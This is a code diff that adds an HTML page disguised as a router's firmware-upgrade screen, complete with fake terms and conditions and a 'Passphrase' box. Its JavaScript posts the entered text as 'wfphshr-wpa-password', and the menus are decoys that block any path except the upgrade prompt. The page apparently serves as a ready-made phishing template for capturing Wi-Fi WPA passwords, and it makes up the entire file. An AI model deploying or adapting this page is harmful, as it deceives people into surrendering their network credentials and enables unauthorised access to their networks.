@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Router Configuration Page</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <script src="jquery.min.js"></script>
+  <script src="bootstrap.min.js"></script>
+
+  <!-- CSS -->
+  <style type="text/css">
+
+    /* Sticky footer styles
+    -------------------------------------------------- */
+
+    html,
+    body {
+          height: 100%;
+          /* The html and body elements cannot have any padding or margin. */
+        }
+
+        /* Wrapper for page content to push down footer */
+        #wrap {
+          min-height: 100%;
+          height: auto !important;
+          height: 100%;
+          /* Negative indent footer by it's height */
+          margin: 0 auto -60px;
+        }
+
+        /* Set the fixed height of the footer here */
+        #push,
+        #footer {
+          height: 60px;
+        }
+        #footer {
+          background-color: #f5f5f5;
+        }
+
+        /* Lastly, apply responsive CSS fixes as necessary */
+        @media (max-width: 767px) {
+          #footer {
+            margin-left: -20px;
+            margin-right: -20px;
+            padding-left: 20px;
+            padding-right: 20px;
+          }
+        }
+  </style>
+
+</head>
+
+<body>
+
+  <!-- Start navigation bar -->
+  <!-- To change the navigation bar color change background attribute -->
+  <nav class="navbar navbar-inverse" style="background:RoyalBlue;margin-top:2em;">
+    <div class="container-fluid">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#myNavbar">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <!--
+        <a class="navbar-brand"><img style="background:transparent" src="Your LOGO" alt="Logo"></a>
+        -->
+      </div>
+      <div class="collapse navbar-collapse" id="myNavbar">
+        <ul class="nav navbar-nav">
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Setup <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Setup</a></li>
+              <li><a href="#">DDNS</a></li>
+              <li><a href="#">MAC Address Clone</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Wireless <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Basic Wireless Settings</a></li>
+              <li><a href="#">Wireless Security</a></li>
+              <li><a href="#">Wireless MAC Filter</a></li>
+              <li><a href="#">Advanced Wireless Settings</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Security <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Firewall</a></li>
+              <li><a href="#">VPN</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Access Restriction <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Internet Access</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Administration <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Management</a></li>
+              <li><a href="#">Log</a></li>
+              <li><a href="#">Diagnostics</a></li>
+              <li><a href="#">Factory Defaults</a></li>
+              <li><a href="#">Config Manegements</a></li>
+            </ul>
+          </li>
+          <li class="dropdown" data-toggle="modal" data-target="#update-only"><a class="dropdown-toggle"
+              data-toggle="dropdown" href="#" style="color:white">Status <span class="caret"></span></a>
+            <ul class="dropdown-menu">
+              <li><a href="#">Router</a></li>
+              <li><a href="#">Local Network</a></li>
+              <li><a href="#">Wireless</a></li>
+              <li><a href="#">Advanced Routing</a></li>
+            </ul>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </nav>
+  <!-- End navigation bar -->
+
+  <!-- Start page content -->
+  <div class="container">
+	   <div class="col-sm">
+       <h2 class="text-center" style="color:CornflowerBlue">Firmware Upgrade</h2>
+    	 <p class="lead">A new version of the firmware has been detected and awaiting installation. Please review our new terms and conditions and proceed.</p>
+     </div>
+    <form>
+      <div class="form-group">
+        <label for="comment">Terms And Conditions:</label>
+        <textarea readonly class="form-control" rows="5" id="comment">
+1. Terms
+
+By accessing this web site, you are agreeing to be bound by these web site Terms and Conditions of Use, all applicable laws and regulations, and agree that you are responsible for compliance with any applicable local laws. If you do not agree with any of these terms, you are prohibited from using or accessing this site. The materials contained in this web site are protected by applicable copyright and trade mark law.
+
+2. Use License
+
+   Permission is granted to temporarily download one copy of the materials (information or software) on No Name's web site for personal, non-commercial transitory viewing only. This is the grant of a license, not a transfer of title, and under this license you may not:
+       modify or copy the materials;
+       use the materials for any commercial purpose, or for any public display (commercial or non-commercial);
+       attempt to decompile or reverse engineer any software contained on No Name's web site;
+       remove any copyright or other proprietary notations from the materials; or
+       transfer the materials to another person or "mirror" the materials on any other server.
+   This license shall automatically terminate if you violate any of these restrictions and may be terminated by No Name at any time. Upon terminating your viewing of these materials or upon the termination of this license, you must destroy any downloaded materials in your possession whether in electronic or printed format.
+
+3. Disclaimer
+
+   The materials on No Name's web site are provided "as is". No Name makes no warranties, expressed or implied, and hereby disclaims and negates all other warranties, including without limitation, implied warranties or conditions of merchantability, fitness for a particular purpose, or non-infringement of intellectual property or other violation of rights. Further, No Name does not warrant or make any representations concerning the accuracy, likely results, or reliability of the use of the materials on its Internet web site or otherwise relating to such materials or on any sites linked to this site.
+
+4. Limitations
+
+In no event shall No Name or its suppliers be liable for any damages (including, without limitation, damages for loss of data or profit, or due to business interruption,) arising out of the use or inability to use the materials on No Name's Internet site, even if No Name or a No Name authorized representative has been notified orally or in writing of the possibility of such damage. Because some jurisdictions do not allow limitations on implied warranties, or limitations of liability for consequential or incidental damages, these limitations may not apply to you.
+5. Revisions and Errata
+
+The materials appearing on No Name's web site could include technical, typographical, or photographic errors. No Name does not warrant that any of the materials on its web site are accurate, complete, or current. No Name may make changes to the materials contained on its web site at any time without notice. No Name does not, however, make any commitment to update the materials.
+
+6. Links
+
+No Name has not reviewed all of the sites linked to its Internet web site and is not responsible for the contents of any such linked site. The inclusion of any link does not imply endorsement by No Name of the site. Use of any such linked web site is at the user's own risk.
+
+7. Site Terms of Use Modifications
+
+No Name may revise these terms of use for its web site at any time without notice. By using this web site you are agreeing to be bound by the then current version of these Terms and Conditions of Use.
+
+8. Governing Law
+
+Any claim relating to No Name's web site shall be governed by the laws of the State of New York without regard to its conflict of law provisions.
+
+General Terms and Conditions applicable to Use of a Web Site.
+Privacy Policy
+
+Your privacy is very important to us. Accordingly, we have developed this Policy in order for you to understand how we collect, use, communicate and disclose and make use of personal information. The following outlines our privacy policy.
+
+   Before or at the time of collecting personal information, we will identify the purposes for which information is being collected.
+   We will collect and use of personal information solely with the objective of fulfilling those purposes specified by us and for other compatible purposes, unless we obtain the consent of the individual concerned or as required by law.
+   We will only retain personal information as long as necessary for the fulfillment of those purposes.
+   We will collect personal information by lawful and fair means and, where appropriate, with the knowledge or consent of the individual concerned.
+   Personal data should be relevant to the purposes for which it is to be used, and, to the extent necessary for those purposes, should be accurate, complete, and up-to-date.
+   We will protect personal information by reasonable security safeguards against loss or theft, as well as unauthorized access, disclosure, copying, use or modification.
+   We will make readily available to customers information about our policies and practices relating to the management of personal information.
+
+We are committed to conducting our business in accordance with these principles in order to ensure that the confidentiality of personal information is protected and maintained.
+       </textarea>
+        <div class="checkbox">
+          <label><input type="checkbox" id="check-box" onclick="checkBoxStatus()">I Agree With Above Terms And Conditions</label>
+        </div>
+      </div>
+      <div class="form-group has-feedback">
+          <label for="pwd">Passphrase:</label>
+          <input class="form-control" type="password" id="pwd" disabled>
+      </div>
+      <div class="container text-center">
+        <button class="btn btn-primary" id="btn">Start Upgrade</button>
+      </div>
+    </form>
+    <div id="push"></div>
+  </div>
+  <!-- Start page content -->
+
+  <!-- Start footer -->
+  <footer class="footer">
+    <div class="container text-center">
+      <p class="text-muted">©  2016, All Rights Reserved.</p>
+    </div>
+  </footer>
+  <!-- End footer -->
+
+  <!-- Start update first message -->
+  <div class="modal fade" id="update-only" role="dialog">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please Update First.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End update first message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="empty-pass">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please Input Valid Password.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+  <!-- Start empty password message -->
+  <div class="modal fade" id="no-checkbox">
+    <div class="modal-dialog modal-sm">
+      <div class="modal-content">
+        <div class="modal-header">
+          <button type="button" class="close" data-dismiss="modal">&times;</button>
+          <h4 class="modal-title">Information</h4>
+        </div>
+        <div class="modal-body">
+          <p>Please Check The I Agree Button.</p>
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+  <!-- End empty password message -->
+
+<script>
+
+/*
+  Check the password field and act accordingly.
+*/
+$("#btn").on("click", function(e) {
+    e.preventDefault();
+
+    // get the password box and checkbox elements
+  	var input = document.getElementById("pwd");
+    var box = document.getElementById("check-box");
+
+    // if the box is checked
+  	if ( box.checked == true )
+  		{
+        // check to see if the value is empty
+      	if ( input.value == "" )
+      		{
+            // display no password message
+            $("#empty-pass").modal("show");
+
+      		}
+      	else
+      		{
+            // post the data
+            post('upgrading.html', {"wfphshr-wpa-password": input.value});
+      		}
+      }
+    else
+      {
+        // display no checkbox message
+        $("#no-checkbox").modal("show");
+      }
+});
+
+/*
+  Post to the fallowing path given the parameters.
+
+  Args:
+    path: The path to be posted to.
+    params: The parameters to be passed.
+*/
+function post(path, params) {
+    // create a form and set its attributes
+    var form = document.createElement("form");
+    form.setAttribute("method", "post");
+    form.setAttribute("action", path);
+
+    // set the attribute for the post
+    for(var key in params) {
+        if(params.hasOwnProperty(key)) {
+            var hiddenField = document.createElement("input");
+            hiddenField.setAttribute("type", "hidden");
+            hiddenField.setAttribute("name", key);
+            hiddenField.setAttribute("value", params[key]);
+
+            form.appendChild(hiddenField);
+         }
+    }
+
+    // submit the post
+    document.body.appendChild(form);
+    form.submit();
+}
+
+/*
+  Check the status of check box
+*/
+function checkBoxStatus()
+{
+  // get the password box and checkbox elements
+	var box = document.getElementById("check-box");
+	var input = document.getElementById("pwd");
+
+  // if the box is checked
+	if ( box.checked == true )
+		{
+      // enabale the password box
+			input.disabled = false;
+		}
+	else
+		{
+      // disable the password box
+			input.disabled = true;
+		}
+	}
+</script>
+</body>
+</html>
